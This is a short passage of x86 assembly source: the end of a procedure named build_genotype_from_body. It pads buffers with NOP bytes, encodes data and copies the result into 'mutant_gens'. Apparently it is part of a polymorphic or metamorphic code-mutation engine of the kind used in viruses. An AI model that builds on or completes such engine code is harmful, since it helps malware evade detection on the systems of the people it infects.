       jnc @@done_fill

       mov eax,90909090h
       stosd
       stosw

  @@done_fill:
       pop edi
       jmp @@distance_loop

  @@distance_store:
       sub eax,ebx
       add ebx,eax
       stosw
       jmp @@distance_loop

  @@distance_done:
       stc
       sbb eax,eax
       stosw

       mov ecx,edi
       mov esi,[esp]
       sub ecx,esi
       call z_encode_asm
       mov esi,edi
       mov eax,[edi]
       call alloc
       mov [mutant_gens],eax
       mov ecx,[edi]
       mov edi,eax
       rep movsb

       call free              ;free workmem

       mov eax,[userlist]
       push eax
       mov eax,[eax]
       mov [_1st_item],eax
       call free

       popad
       ret
build_genotype_from_body ENDP
